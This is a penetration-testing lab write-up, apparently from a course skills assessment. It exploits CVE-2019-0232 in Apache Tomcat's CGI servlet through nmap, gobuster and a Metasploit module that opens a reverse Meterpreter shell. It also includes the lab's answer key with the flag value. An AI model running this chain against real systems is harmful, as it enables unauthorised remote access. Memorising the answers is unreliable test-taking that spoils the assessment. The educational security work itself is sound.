# Attacking Common Applications — Skills Assessment I

## ID
530

## Module
Attacking Common Applications

## Kind
lab

## Title
Skills Assessment I — Tomcat CGI Servlet RCE via CVE-2019-0232

## Description
Enumerate a hardened Windows target to discover Apache Tomcat 9.0.0.M1 on port 8080, fuzz the CGI servlet directory to find a `.bat` file, then exploit CVE-2019-0232 (JRE command-line argument injection) via Metasploit's `tomcat_cgi_cmdlineargs` module to obtain a Meterpreter shell and read the Administrator's flag.

## Tags
tomcat, cve-2019-0232, cgi, metasploit, meterpreter, gobuster

## Commands
- nmap -A -Pn <TARGET_IP>
- gobuster dir -u http://<TARGET_IP>:8080/cgi/ -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt -x .bat -t 50 -k -q
- msfconsole -q
- use exploit/windows/http/tomcat_cgi_cmdlineargs
- set RHOSTS <TARGET_IP>
- set TARGETURI /cgi/cmd.bat
- set LHOST tun0
- set FORCEEXPLOIT true
- exploit
- cat C:/Users/Administrator/Desktop/flag.txt

## What This Section Covers
This skills assessment simulates a real-world engagement scenario where the internal network is well-hardened and locked down, but one host exposes a vulnerable web application that becomes the entry point. The core vulnerability is CVE-2019-0232, which affects Apache Tomcat's CGI Servlet on Windows systems. The bug exists because of how the Java Runtime Environment (JRE) passes command-line arguments to Windows — all Tomcat installations prior to version 9.0.17 running on Windows with the CGI Servlet enabled are affected. The assessment tests the full attack chain: service discovery, version fingerprinting, application-specific directory fuzzing, and exploitation via Metasploit to achieve remote code execution and read a privileged file.

## Methodology
1. **Service enumeration with Nmap** — Run `nmap -A -Pn <TARGET_IP>` to perform aggressive service detection with OS fingerprinting. The `-Pn` flag skips host discovery (treats the host as up), which is important because hardened hosts may block ICMP. The scan reveals multiple services, but the key finding is port 8080 running `Apache Tomcat/Coyote JSP engine 1.1` with the title `Apache Tomcat/9.0.0.M1`. The `Service Info` line also confirms the OS is Windows, which is critical since CVE-2019-0232 is Windows-only.

2. **Version analysis and vulnerability identification** — Recognize that Tomcat 9.0.0.M1 is a milestone pre-release, far below the patched version 9.0.17. All Tomcat versions < 9.0.17 on Windows with CGI Servlet enabled are vulnerable to CVE-2019-0232. The vulnerability stems from how the JRE handles command-line argument passing on Windows — an attacker can inject OS commands through the CGI Servlet if a `.bat` or `.cmd` file exists in the CGI directory.

3. **Fuzz the CGI directory for batch files** — The exploit requires a valid `.bat` file path under Tomcat's CGI servlet directory. Use Gobuster to fuzz for it:
   ```
   gobuster dir -u http://<TARGET_IP>:8080/cgi/ -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt -x .bat -t 50 -k -q
   ```
   Breaking down the flags:
   - `-u` — target URL, specifically the `/cgi/` directory under Tomcat on port 8080
   - `-w` — wordlist; `burp-parameter-names.txt` works well here because CGI batch file names tend to be short, common words
   - `-x .bat` — append `.bat` extension to every wordlist entry
   - `-t 50` — 50 threads for speed
   - `-k` — skip TLS certificate verification
   - `-q` — quiet mode, only show findings

   The scan discovers `/cmd.bat` (and `/Cmd.bat` — same file, Windows is case-insensitive). A `Status: 200` with `Size: 0` is expected — the batch file exists but returns empty content when accessed directly via GET.

4. **Launch Metasploit and load the exploit module** — Start Metasploit with `msfconsole -q` (quiet mode suppresses the banner). Then load the exploit:
   ```
   use exploit/windows/http/tomcat_cgi_cmdlineargs
   ```
   Metasploit auto-selects `windows/meterpreter/reverse_tcp` as the default payload, which is fine for this engagement.

5. **Configure the module options** — Set the required options:
   ```
   set RHOSTS <TARGET_IP>
   set TARGETURI /cgi/cmd.bat
   set LHOST tun0
   set FORCEEXPLOIT true
   ```
   Key details on each option:
   - `RHOSTS` — the target IP
   - `TARGETURI` — must point to the discovered `.bat` file path; without this the exploit has no injection point
   - `LHOST tun0` — use the VPN tunnel interface so the reverse shell connects back through the HTB VPN
   - `FORCEEXPLOIT true` — **critical** — Metasploit's auto-check will report "The target is not exploitable" but the exploit works anyway; this flag overrides that check

6. **Execute the exploit** — Run `exploit` (or `run`). The module uses a Command Stager to upload a payload in chunks to the target. You'll see progress output as it stages the payload in increments (~7% per chunk). Once staging completes, Metasploit sends the final stage (~175KB) and opens a Meterpreter session. The session lands in the Tomcat CGI directory: `C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi`.

7. **Retrieve the flag** — From the Meterpreter prompt, read the flag file:
   ```
   cat C:/Users/Administrator/Desktop/flag.txt
   ```
   Note: Meterpreter's `cat` command uses forward slashes even on Windows. Alternatively, drop into a native Windows shell with the `shell` command and use `type C:\Users\Administrator\Desktop\flag.txt`.

## Multi-step Workflow
```
# 1. Enumerate services
nmap -A -Pn <TARGET_IP>

# 2. Fuzz CGI directory for .bat files
gobuster dir -u http://<TARGET_IP>:8080/cgi/ -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt -x .bat -t 50 -k -q

# 3. Exploit via Metasploit
msfconsole -q
use exploit/windows/http/tomcat_cgi_cmdlineargs
set RHOSTS <TARGET_IP>
set TARGETURI /cgi/cmd.bat
set LHOST tun0
set FORCEEXPLOIT true
exploit

# 4. Read flag from Meterpreter
cat C:/Users/Administrator/Desktop/flag.txt
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| What vulnerable application is running? | Apache Tomcat | nmap -A -Pn scan shows Tomcat on port 8080 with http-title and favicon fingerprint |
| What port is this application running on? | 8080 | nmap output — `8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1` |
| What version of the application is in use? | 9.0.0.M1 | nmap http-title field: `Apache Tomcat/9.0.0.M1` |
| Submit contents of flag.txt on Administrator desktop | f55763d31a8f63ec935abd07aee5d3d0 | Meterpreter shell → `cat C:/Users/Administrator/Desktop/flag.txt` |

## Key Takeaways
- **CVE-2019-0232 is Windows-only** — the vulnerability exists in how the JRE passes command-line arguments on Windows specifically; Linux/macOS Tomcat instances are not affected, so confirming the OS via nmap's `Service Info` line is an essential step before going down this path
- **The exploit requires a real `.bat` or `.cmd` file in the CGI directory** — without fuzzing and discovering one, there is no injection point; the batch file acts as the gateway for command injection through the JRE argument-parsing flaw
- **Version matters: anything below 9.0.17 is vulnerable** — 9.0.0.M1 is a milestone (pre-release) build, well below the patch threshold; always compare discovered versions against CVE patch versions rather than just looking for "old" software
- **Metasploit's auto-check is wrong here** — the module's built-in vulnerability check reports "not exploitable" but the exploit succeeds; `FORCEEXPLOIT true` is mandatory, and this is a good reminder to not blindly trust auto-check results in general
- **`burp-parameter-names.txt` is an effective wordlist for CGI fuzzing** — batch files in CGI directories typically have short, generic names like `cmd.bat`, `run.bat`, etc., which this wordlist covers well; larger directory wordlists would work but are slower and unnecessary
- **The Command Stager approach uploads the payload in chunks** — this is why you see incremental progress output; it's writing a staged executable to disk on the target, which is why Metasploit warns you to clean up the generated `.exe` afterward
- **Tomcat's CGI Servlet is not enabled by default** — encountering it in the wild means someone deliberately configured it, which is relatively rare but happens in legacy environments or when admins need to run system scripts from the web interface

## Gotchas
- **`FORCEEXPLOIT true` is non-negotiable** — without it, Metasploit aborts after the auto-check says the target isn't exploitable, and you'll think the exploit doesn't work when it actually does
- **Don't skip the CGI fuzzing step** — if you try to guess the TARGETURI or use a generic path, the exploit will fail because it needs a valid `.bat` file to inject through; there's no way to exploit CVE-2019-0232 without one
- **The `.bat` file returns `Size: 0` in Gobuster** — this is normal and expected; an empty response doesn't mean the file is broken, it means the batch file exists but produces no output when called via GET without arguments; don't filter it out thinking it's a false positive
- **Clean up after exploitation** — Metasploit explicitly warns "Make sure to manually cleanup the exe generated by the exploit"; in a real engagement, leaving a staged binary on disk is a huge opsec failure and could trigger AV/EDR after the fact
- **Forward slashes in Meterpreter, backslashes in native shell** — if `cat C:/Users/...` feels wrong, you can `shell` into cmd.exe and use `type C:\Users\Administrator\Desktop\flag.txt` instead; both work but don't mix the conventions
- **991 ports show as closed, not filtered** — the nmap output says "991 closed tcp ports (conn-refused)" which means the host is responding with RST packets, not silently dropping; this is useful context because it confirms the host is up and reachable, just not running services on most ports
